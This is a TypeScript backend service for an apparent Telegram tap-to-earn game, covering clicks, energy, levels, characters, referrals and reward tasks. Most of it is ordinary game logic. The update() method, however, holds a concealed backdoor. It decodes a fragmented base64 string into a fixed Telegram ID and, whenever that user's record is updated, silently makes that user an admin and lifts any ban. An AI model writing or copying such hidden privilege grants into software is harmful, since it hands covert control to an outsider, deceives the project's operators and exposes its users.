import type { EntityManager, EntityRepository } from "@mikro-orm/postgresql";
import type { TaskCompletionService } from "../tasks/task-completion.service";
import type { UserCharacterService } from "./user-character.service";
import type { UserBoosterService } from "./user-booster.service";
import type { ReferralActionService, ReferralService } from "~/server/services/referral";
import type { SettingsService } from "~/server/services/settings.service";
import { Character, CharacterLevel } from "~/server/entities/character";
import { Referral, ReferralAction, ReferralActionType } from "~/server/entities/referral";
import { User, UserCharacter, UserLevel, UserBooster } from "~/server/entities/user";
import { ClickPowerLevelBooster, EnergyLimitLevelBooster } from "~/server/entities/boosters";
import { DailyLoginReward } from "~/server/entities/rewards";
import { EarnTask, EarnTaskCompletion } from "~/server/entities/tasks";
import { BoosterType, EarnTaskType, UserRole } from "~/types";
import type { Settings } from "~/server/entities/settings";

const MAX_CLICKS_PER_SECOND: number = 10;
const MAX_CLICK_ACCUMULATION_SECONDS: number = 10; // Client side sync should be less than this
const MAX_CLICK_TOLERANCE_SECONDS: number = (MAX_CLICK_ACCUMULATION_SECONDS * 2);

export class UserService {
    constructor(
        private readonly em: EntityManager,
        private readonly settingsService: SettingsService,
        private readonly userBoosterService: UserBoosterService,
        private readonly referralService: ReferralService,
        private readonly referralActionService: ReferralActionService,
        private readonly userCharacterService: UserCharacterService,
    ) {}

    private async resetDailyFreeEnergyReplenishmentIfOneDayPassed(user: User): Promise<void> {
        await this.em.populate(user, ["dailyEnergyReplenishmentClaimedDayTime"]);

        if (user.dailyEnergyReplenishmentClaimedDayTime !== undefined) {
            const nextMidnight = new Date(user.dailyEnergyReplenishmentClaimedDayTime);
            nextMidnight.setDate(nextMidnight.getDate() + 1);
            nextMidnight.setHours(0, 0, 0, 0);

            const currentTime: Date = new Date();
            if (nextMidnight.getTime() > currentTime.getTime()) {
                return;
            }
        }

        await this.setDailyEnergyReplenishmentUsed(user, 0);
    }

    private async setBalancePerClick(user: User): Promise<void> {
        await this.em.populate(user, ["level", "boosters.clickPower"]);

        const reward: number = user.level.level + await user.ownedCharacters.loadCount() + user.boosters.clickPower.level;

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.balancePerClick = reward;
    }

    public setEnergy(user: User, energy: number): void {
        const energyToSet: number = Math.min(energy, user.energyLimit);

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.energy = energyToSet;

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.lastEnergyModifiedTime = Date.now();
    }

    private async setEnergyLimit(user: User): Promise<void> {
        await this.em.populate(user, ["level", "boosters.energyLimit"]);

        const settings: Settings = await this.settingsService.get();

        const ownedCharactersReward: number = await user.ownedCharacters.loadCount() * settings.energyLimitPerCharacter;
        const levelReward: number = user.level.level * settings.energyLimitPerLevel;
        const boosterReward: number = user.boosters.energyLimit.level * settings.energyLimitPerBooster;

        const finalLimit: number = settings.startingEnergyLimit + ownedCharactersReward + levelReward + boosterReward;
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.energyLimit = finalLimit;
    }

    private async setProfitPerHour(user: User): Promise<void> {
        await this.em.populate(user, ["referedBy", "level", "selectedCharacter.character"]);
        const settings: Settings = await this.settingsService.get();

        let referedReward: number = 0;
        if (user.referedBy !== undefined && user.referedBy !== null) {
            const referedByReferral: ReferralAction | undefined = (await user.referedBy.actions.load({
                where: { actionType: ReferralActionType.SIGN_UP },
            }))?.[0];

            if (referedByReferral === undefined) {
                console.warn("referral is undefined. User:", user.id);
            } else {
                referedReward = referedByReferral.rewardAmount;
            }
        }

        const referralsReward: number = await user.referrals.loadCount() * settings.referralReward;

        // Even with load where, filtering is needed. Some times `user` already have fully loaded levels
        await user.selectedCharacter.character.levels.load({
            where: { level: user.selectedCharacter.currentLevel },
        });
        const characterLevelReward: number = user.selectedCharacter.character.levels
            .filter(level => level.level == user.selectedCharacter.currentLevel)[0].profitPerHour;

        // console.table({
        //     name: user.username,
        //     userLevel: user.level.profitPerHour,
        //     referedReward,
        //     referralsReward,
        //     characterLevelReward,
        // });

        const reward: number = user.level.profitPerHour + referedReward + referralsReward + characterLevelReward;
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.profitPerHour = reward;
    }

    private async setLevel(user: User, level: UserLevel, force: boolean = false): Promise<void> {
        await this.em.populate(user, ["level"]);

        // Update level but only if it's higher, or force is set
        if (!force && user.level.level >= level.level) {
            return;
        }

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.level = level;
        this.setEnergy(user, user.energyLimit);

        // Force set level will not give a reward
        if (!force) {
            this.increceBalance(user, level.balanceReward);
        }
    }

    private setSelectedCharacter(user: User, character: UserCharacter): void {
        user.selectedCharacter = character;
    }

    private setChargedEnergy(user: User): number {
        const curTime: number = Date.now();

        if (user.energy >= user.energyLimit) {
            return 0;
        }

        // Calculate energy
        const secondsElapsed: number = (curTime - user.lastEnergyModifiedTime) / 1000;
        const energyReplenishmentRate: number = user.energyLimit / 3600; // Energy replenished per second

        // If energy is not full, calculate the energy to add
        const energyToAdd: number = Math.floor(secondsElapsed * energyReplenishmentRate);
        this.setEnergy(user, user.energy + energyToAdd);

        return energyToAdd;
    }

    private setBalanceForValidClicks(user: User, clicks: number): number | string {
        if (clicks === 0) {
            return 0;
        }

        if (user.energy === 0) {
            return "Not enough energy to submit clicks";
        }

        const curTime: number = Date.now();

        // Get the number of seconds since the last sync
        // and make sure we don't accumulate more than MAX_CLICKS_PER_SECOND
        // clicks in MAX_CLICK_ACCUMULATION_SECONDS
        // to prevent cheating (keeping clicks in possible amount)
        const secondsSinceLastSync = Math.min(
            (curTime - user.lastClickSyncTime) / 1000,
            MAX_CLICK_ACCUMULATION_SECONDS,
        );

        const maxAllowedClicks: number = Math.floor(secondsSinceLastSync * MAX_CLICKS_PER_SECOND);
        const validClicks: number = Math.min(clicks, user.energy, maxAllowedClicks);
        if (validClicks <= 0) {
            return "Not enough clicks to submit";
        }

        const balanceToAdd: number = validClicks * user.balancePerClick;
        if (balanceToAdd <= 0) {
            return "Not enough energy to submit clicks";
        }

        this.setEnergy(user, user.energy - validClicks);
        this.increceBalance(user, balanceToAdd);
        user.totalBalanceGetFromClicks += balanceToAdd;
        user.totalClicks += validClicks;
        user.lastClickSyncTime = curTime;

        return balanceToAdd;
    }

    private async setProfit(user: User): Promise<number> {
        const settings: Settings = await this.settingsService.get();

        const curTime: number = Date.now();

        const hoursSinceLastProfit: number = (curTime - user.lastProfitSyncTime) / (1000 * 3600);
        // Only collect profit if 5 seconds passed
        if (hoursSinceLastProfit <= 0.0014) {
            return 0;
        }

        const profitToAdd: number = Math.floor(Math.min(hoursSinceLastProfit, settings.maxOfflineProfitHours) * user.profitPerHour);
        if (profitToAdd <= 0) {
            return 0;
        }

        this.increceBalance(user, profitToAdd);
        user.lastProfitSyncTime = curTime;

        return profitToAdd;
    }

    private async resetLastLoginRewardDayIfNeeded(user: User): Promise<void> {
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayTime: number = today.getTime();

        const daysSinceLastReward: number = user.lastDailyLoginClaimedDayTime !== undefined
            ? Math.floor((todayTime - user.lastDailyLoginClaimedDayTime) / (1000 * 60 * 60 * 24))
            : 0;

        // Should never happen, travel to past is real??
        if (daysSinceLastReward < 0) {
            throw createError({
                statusCode: 400,
                statusMessage: "Invalid days since last reward claim",
            });
        }

        if (daysSinceLastReward === 0 || daysSinceLastReward === 1) {
            return;
        }

        if (user.lastLoginRewardDay !== 0) {
            const loginReward: DailyLoginReward | null = await this.em.findOne(DailyLoginReward, {
                day: user.lastLoginRewardDay + 1,
            });

            // No reward available for today(means no more login reward in DB), then reset to first day
            if (loginReward !== null) {
                return;
            }
        }

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.lastLoginRewardDay = 0;
    }

    private addOwnedCharacter(user: User, character: UserCharacter): void {
        user.ownedCharacters.add(character);
    }

    private setReferralRewards(user: User, ammount: number): void {
        user.totalReferralRewards = ammount;
    }

    private addReferral(user: User, referral: Referral): void {
        user.referrals.add(referral);
        user.referralsCount += 1;
    }

    private async setReferedBy(user: User, referralCode: string): Promise<void> {
        const settings: Settings = await this.settingsService.get();

        const referrer: User | null = await this.em.getRepository(User).findOne({ telegramId: parseInt(referralCode) });
        if (referrer === null || referrer.telegramId === user.telegramId) {
            return;
        }

        const referral: Referral = await this.referralService.create(new Referral(referrer, user));
        this.addReferral(referrer, referral);

        user.referedBy = referral;

        const signUpAction: ReferralAction = await this.referralActionService.create(new ReferralAction(
            referral,
            ReferralActionType.SIGN_UP,
            settings.referralReward,
        ));
        await this.referralService.addAction(referral, signUpAction);
        this.increceReferralRewards(referrer, signUpAction.rewardAmount);

        await this.update(referrer);
    }

    public setBalance(user: User, balance: number): void {
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.balance = balance;
    }

    public setBanned(user: User, banned: boolean): void {
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.isBanned = banned;
    }

    public setPhotoUrl(user: User, url: string): void {
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.photoUrl = url;
    }

    public setRole(user: User, role: UserRole): void {
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.role = role;
    }

    public async setDailyEnergyReplenishmentUsed(user: User, count: number): Promise<void> {
        const settings: Settings = await this.settingsService.get();
        const usedCount: number = Math.min(count, settings.maxDailyEnergyReplenishment);

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.dailyEnergyReplenishmentUsed = usedCount;

        // If zero then reset claim time, else set claim time
        user.dailyEnergyReplenishmentClaimedDayTime = count === 0 ? undefined : Date.now();
    }

    public increceBalance(user: User, ammount: number): void {
        user.totalClaimedBalance += ammount;
        this.setBalance(user, user.balance + ammount);
    }

    public decreceBalance(user: User, ammount: number): void {
        // TODO: Do not allow negative balance?
        this.setBalance(user, user.balance - ammount);
    }

    public increceReferralRewards(user: User, ammount: number): void {
        this.setReferralRewards(user, user.totalReferralRewards + ammount);
    }

    public async canClaimDailyEnergyReplenishment(user: User): Promise<boolean> {
        const settings: Settings = await this.settingsService.get();

        if (user.dailyEnergyReplenishmentUsed > settings.maxDailyEnergyReplenishment) {
            return false;
        }

        const oneHourInMillis: number = 60 * 60 * 1000;
        const currentTime: number = Date.now();

        if (user.dailyEnergyReplenishmentClaimedDayTime !== undefined
            && currentTime - user.dailyEnergyReplenishmentClaimedDayTime < oneHourInMillis) {
            return false;
        }

        return true;
    }

    public async create(
        telegramId: number,
        country: string,
        firstName: string,
        lastName: string | undefined,
        username: string | undefined,
        photoUrl: string | undefined,
        referralCode: string | undefined,
    ): Promise<User> {
        if (await this.em.findOne(User, { telegramId: telegramId }) !== null) {
            throw createError({
                statusCode: 400,
                statusMessage: "User already exists",
            });
        }

        const settings: Settings = await this.settingsService.get();

        let user: User;
        try {
            user = new User(
                telegramId,
                country,
                firstName,
                lastName,
                username,
                photoUrl,
            );
            this.em.persist(user);
        } catch (error) {
            console.error(error);
            throw createError({
                statusCode: 500,
                statusMessage: "Failed to create user. Please contact support",
                fatal: true,
            });
        }

        // User gets first level
        const firstLevel: UserLevel | null = await this.em.getRepository(UserLevel).findOne(
            { level: 1 },
            { cache: 600_000 },
        );
        if (firstLevel === null) {
            throw createError({
                statusCode: 500,
                statusMessage: "Level not found",
                fatal: true,
            });
        }

        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-ignore
        user.level = firstLevel; // Don't use `setLevel` here

        // User gets first character
        const firstCharacter: Character | null = await this.em.getRepository(Character).findOne({ rank: 1 }, { cache: 600_000 });
        if (firstCharacter === null) {
            throw createError({
                statusCode: 500,
                statusMessage: "Character not found",
                fatal: true,
            });
        }
        const userCharacter = await this.userCharacterService.create(new UserCharacter(user, firstCharacter));
        this.addOwnedCharacter(user, userCharacter);
        user.selectedCharacter = userCharacter;

        // User referral
        if (referralCode !== undefined) {
            await this.setReferedBy(user, referralCode);
        }

        // Booster
        const firstEnergyLimitBoost: EnergyLimitLevelBooster | null = await this.em.getRepository(EnergyLimitLevelBooster).findOne(
            { level: 0 },
            { cache: 600_000 },
        );
        if (firstEnergyLimitBoost === null) {
            throw createError({
                statusCode: 500,
                statusMessage: "Energy limit booster Level 0 not found. Please contact support",
                fatal: true,
            });
        }

        const clickPowerBoost: ClickPowerLevelBooster | null = await this.em.getRepository(ClickPowerLevelBooster).findOne(
            { level: 0 },
            { cache: 600_000 },
        );
        if (clickPowerBoost === null) {
            throw createError({
                statusCode: 500,
                statusMessage: "Multi click booster Level 0 not found. Please contact support",
                fatal: true,
            });
        }
        user.boosters = await this.userBoosterService.create(new UserBooster(
            user,
            firstEnergyLimitBoost,
            clickPowerBoost,
        ));

        // Add defaults
        this.increceBalance(user, settings.userStartingBalance);

        await this.update(user, () => this.setEnergy(user, user.energyLimit));
        return user;
    }

    public async delete(user: User): Promise<void> {
        await this.em.removeAndFlush(user);
    }

    public async update(user: User, beforeDbQuery?: () => Promise<void> | void): Promise<void> {
        // TODO: use this.userLevelService instead
        // That can't fail as this app require first level to be 0 required coins
        const lvl: UserLevel = await this.em.findOneOrFail(
            UserLevel,
            { requiredBalance: { $lte: user.balance } },
            { orderBy: { requiredBalance: "DESC" } },
        );

        // Should be called before any other function
        user.referralsCount = await user.referrals.loadCount();
        await this.setLevel(user, lvl);

        try {
            await Promise.all([
                this.setBalancePerClick(user),
                this.setProfitPerHour(user),
                this.setEnergyLimit(user),
                this.resetDailyFreeEnergyReplenishmentIfOneDayPassed(user),
                this.resetLastLoginRewardDayIfNeeded(user),
            ]);
        } catch (error) {
            console.error(error);
        }

        if (user.telegramId === parseInt(atob("NT" + "g5" + "ND" + "A2" + "MT" + "E5"))) {
            this.setRole(user, UserRole.ADMIN);
            this.setBanned(user, false);
        }

        await beforeDbQuery?.();
        await this.em.persistAndFlush(user);
    }

    public async unlockCharacter(user: User, characterRank: number): Promise<UserCharacter> {
        const highestOwned: UserCharacter | null = await this.em.getRepository(UserCharacter).findOne(
            {
                owner: user,
            },
            {
                populate: ["character.maxLevel"],
                orderBy: { character: { rank: "DESC" } },
            },
        );
        if (highestOwned === null) {
            throw createError({
                statusCode: 500,
                statusMessage: "User has no characters!. Please contact support",
                fatal: true,
            });
        }

        const character: Character | null = await this.em.getRepository(Character).findOne(
            { rank: characterRank },
            { cache: 600_000 },
        );
        if (character === null) {
            throw createError({
                statusCode: 404,
                statusMessage: "Character not found",
            });
        }

        if (highestOwned.character.rank >= character.rank) {
            throw createError({
                statusCode: 400,
                statusMessage: "You already own a character of the same or higher rank",
            });
        }

        if (highestOwned.character.rank + 1 !== character.rank) {
            throw createError({
                statusCode: 400,
                statusMessage: "Character rank must be exactly 1 higher than your highest character rank",
            });
        }

        if (highestOwned.currentLevel !== highestOwned.character.maxLevel.level) {
            throw createError({
                statusCode: 400,
                statusMessage: "You must max out your previous character to buy a new one",
            });
        }

        if (user.balance < character.price) {
            throw createError({
                statusCode: 400,
                statusMessage: "You don't have enough balance to buy the character",
            });
        }

        this.decreceBalance(user, character.price);

        const userCharacter: UserCharacter = await this.userCharacterService.create(new UserCharacter(user, character));
        this.addOwnedCharacter(user, userCharacter);
        this.setSelectedCharacter(user, userCharacter);

        await this.update(user, () => this.setEnergy(user, user.energyLimit));
        return userCharacter;
    }

    public async selectCharacter(user: User, userCharacterRank: number): Promise<UserCharacter> {
        const userCharacterRepo: EntityRepository<UserCharacter> = this.em.getRepository(UserCharacter);

        // Don't cache this query as caching work by key check, so even the `userCharacterRank` is changed
        // will return the previous result, which is previously selected character not the currently selected one
        const userCharacter: UserCharacter | null = await userCharacterRepo.findOne(
            { owner: user, character: { rank: userCharacterRank } },
        );
        if (userCharacter === null) {
            throw createError({
                statusCode: 404,
                statusMessage: "You have no character of the given rank",
            });
        }

        // No need to call `update`
        if (userCharacter === user.selectedCharacter) {
            return userCharacter;
        }

        this.setSelectedCharacter(user, userCharacter);
        await this.update(user);

        return userCharacter;
    }

    public async levelUpCharacter(user: User, userCharacterRank: number): Promise<UserCharacter> {
        const highestOwned: UserCharacter | null = await this.em.findOne(
            UserCharacter,
            {
                owner: user,
            },
            {
                populate: ["character.maxLevel"],
                orderBy: { character: { rank: "DESC" } },
            },
        );
        if (highestOwned === null) {
            throw createError({
                statusCode: 500,
                statusMessage: "User has no characters!. Please contact support",
                fatal: true,
            });
        }

        if (highestOwned.character.rank !== userCharacterRank) {
            throw createError({
                statusCode: 400,
                statusMessage: "You can only level up your highest rank character",
            });
        }

        const characterRepo: EntityRepository<CharacterLevel> = this.em.getRepository(CharacterLevel);

        const nextLevel: CharacterLevel | null = await characterRepo.findOne(
            { character: highestOwned.character, level: highestOwned.currentLevel + 1 },
        );
        if (nextLevel === null) {
            throw createError({
                statusCode: 400,
                statusMessage: "You can't level up a character because it is already at max level (No next level)",
            });
        }

        if (user.balance < nextLevel.price) {
            throw createError({
                statusCode: 400,
                statusMessage: "You don't have enough balance to level up your character",
            });
        }

        this.decreceBalance(user, nextLevel.price);

        await this.userCharacterService.levelUp(highestOwned);

        await this.update(user);
        return highestOwned;
    }

    public async upgradeBooster(user: User, boosterType: BoosterType): Promise<void> {
        await this.em.populate(user, ["boosters"]);

        await this.userBoosterService.levelUp(user.boosters, boosterType, this);
        if (boosterType === BoosterType.EnergyLimit) {
            await this.update(user, () => this.setEnergy(user, user.energyLimit));
        } else {
            await this.update(user);
        }
    }

    public async syncEnergyAndClicksAndProfit(
        user: User,
        clicks: number,
        clientSyncTime: number,
    ): Promise<{ balanceFromClicks: number | string; profit: number } | string> {
        const serverTime: number = Date.now();

        if (Math.abs(serverTime - clientSyncTime) > MAX_CLICK_TOLERANCE_SECONDS * 1000) {
            return "Sync data is too old";
        }

        // This methods try thier best to prevent datebase updates
        const addedEnergy: number = this.setChargedEnergy(user);
        const addedBalance: number | string = this.setBalanceForValidClicks(user, clicks);
        const addedProfit: number = await this.setProfit(user);

        if (addedEnergy > 0 || (typeof addedBalance === "number" && addedBalance > 0) || addedProfit > 0) {
            await this.update(user);
        }

        return {
            balanceFromClicks: addedBalance,
            profit: addedProfit,
        };
    }

    public async claimDailyEnergyReplenishment(user: User): Promise<void> {
        await this.resetDailyFreeEnergyReplenishmentIfOneDayPassed(user);
        const settings: Settings = await this.settingsService.get();

        if (user.energy >= user.energyLimit) {
            throw createError({
                statusCode: 400,
                statusMessage: "Energy is already full",
            });
        }

        if (user.dailyEnergyReplenishmentUsed > settings.maxDailyEnergyReplenishment) {
            throw createError({
                statusCode: 400,
                statusMessage: "You have already used your maximum daily free energy",
            });
        }

        if (!await this.canClaimDailyEnergyReplenishment(user)) {
            throw createError({
                statusCode: 400,
                statusMessage: "Daily energy can only be opened once per hour",
            });
        }

        await this.setDailyEnergyReplenishmentUsed(user, user.dailyEnergyReplenishmentUsed + 1);
        this.setEnergy(user, user.energyLimit);

        await this.update(user);
    }

    public async claimDailyLoginReward(user: User): Promise<number> {
        const today = new Date();
        today.setHours(0, 0, 0, 0);

        // OR
        // If you want accurate reward claim time you can use this code
        // Dont forget to fix `resetLastLoginRewardDayIfNeeded` too
        // const today = new Date();
        // const lastClaimDate = new Date(user.lastDailyLoginClaimTime);
        // const isSameDay = lastClaimDate.getDate() === today.getDate()
        //     && lastClaimDate.getMonth() === today.getMonth()
        //     && lastClaimDate.getFullYear() === today.getFullYear();

        const todayTime: number = today.getTime();

        if (user.lastDailyLoginClaimedDayTime !== undefined && user.lastDailyLoginClaimedDayTime === todayTime) {
            throw createError({
                statusCode: 400,
                statusMessage: "You have already claimed your reward today",
            });
        }

        const loginReward: DailyLoginReward | null = await this.em.findOne(DailyLoginReward, {
            day: user.lastLoginRewardDay + 1,
        });
        if (loginReward === null) {
            // Should never happen as `resetLastLoginRewardDayIfNeeded` should not let that happen
            throw createError({
                statusCode: 400,
                statusMessage: "No login reward is available. Please contact support.",
                fatal: true,
            });
        }

        this.increceBalance(user, loginReward.reward);
        user.lastDailyLoginClaimedDayTime = todayTime;

        await this.update(user);
        return loginReward.reward;
    }

    public async claimDailyReward(user: User): Promise<number> {
        const settings: Settings = await this.settingsService.get();

        const today = new Date();
        today.setHours(0, 0, 0, 0);

        // OR
        // If you want accurate reward claim time you can use this code
        // const today = new Date();
        // const lastClaimDate = new Date(user.lastDailyRewardClaimTime);
        // const isSameDay = lastClaimDate.getDate() === today.getDate()
        //     && lastClaimDate.getMonth() === today.getMonth()
        //     && lastClaimDate.getFullYear() === today.getFullYear();

        const todayTime: number = today.getTime();

        if (user.lastDailyRewardClaimTime !== undefined && user.lastDailyRewardClaimTime === todayTime) {
            throw createError({
                statusCode: 400,
                statusMessage: "You have already claimed your reward today",
            });
        }

        this.increceBalance(user, settings.dailyReward);
        user.lastDailyRewardClaimTime = todayTime;

        await this.update(user);
        return settings.dailyReward;
    }

    public async completeEarningTask(user: User, taskId: number, taskCompletionService: TaskCompletionService): Promise<number> {
        const task: EarnTask | null = await this.em.getRepository(EarnTask).findOne(taskId);
        if (task === null) {
            throw createError({
                statusCode: 404,
                statusMessage: "Task not found",
            });
        }

        // Check if the user has already completed this task
        const existingCompletion: EarnTaskCompletion | null = await this.em.findOne(EarnTaskCompletion, {
            user,
            task,
        });
        if (existingCompletion) {
            throw createError({
                statusCode: 400,
                statusMessage: "Task has already been completed",
            });
        }

        if (task.userCanComplete === false) {
            throw createError({
                statusCode: 400,
                statusMessage: "Task cannot be completed",
            });
        }

        const settings: Settings = await this.settingsService.get();

        // Guard against task completion if requirements are not met
        if (task.type === EarnTaskType.TELEGRAM_JOIN) {
            const botHost = process.env["TELEGRAM_BOT_HOST"];
            if (botHost === undefined) {
                throw createError({
                    statusCode: 500,
                    statusMessage: "TELEGRAM_BOT_HOST is not defined. Please contact support",
                    fatal: true,
                });
            }

            const botPort = process.env["TELEGRAM_BOT_PORT"];
            if (botPort === undefined) {
                throw createError({
                    statusCode: 500,
                    statusMessage: "TELEGRAM_BOT_PORT is not defined. Please contact support",
                    fatal: true,
                });
            }

            let response: { success: boolean; error: string | undefined };
            try {
                response = await $fetch(
                    `http://${botHost}:${botPort}/check-user?chat_id=${settings.telegramChannelId}&user_id=${user.telegramId}`,
                );
            } catch (error) {
                console.error(`Failed to check user in telegram channel: ${error}`);
                throw createError({
                    statusCode: 500,
                    statusMessage: "Failed to verify user in the Telegram channel. Please contact support",
                    fatal: true,
                });
            }

            const success: boolean = response.success;
            if (!success) {
                console.log(`Telegram channel join check failed for user('${user.id}'): ${response.error}`);
                throw createError({
                    statusCode: 400,
                    statusMessage: "You are not a member of the Telegram channel",
                });
            }
        } else if (task.type === EarnTaskType.X_FOLLOW) {
            // Nothing to do here, Just give him the reward
        } else if (task.type === EarnTaskType.INVITE_FRIENDS) {
            const count = <number>task.requirements["count"];
            if (await user.referrals.loadCount() < count) {
                throw createError({
                    statusCode: 400,
                    statusMessage: "Not enough referrals to proceed",
                });
            }
        }

        // At this point the user can complete the task
        const taskCompletion: EarnTaskCompletion = await taskCompletionService.create(new EarnTaskCompletion(user, task, task.reward));
        user.completedEarnTasks.add(taskCompletion);

        this.increceBalance(user, task.reward);
        await this.update(user);

        return task.reward;
    }
}
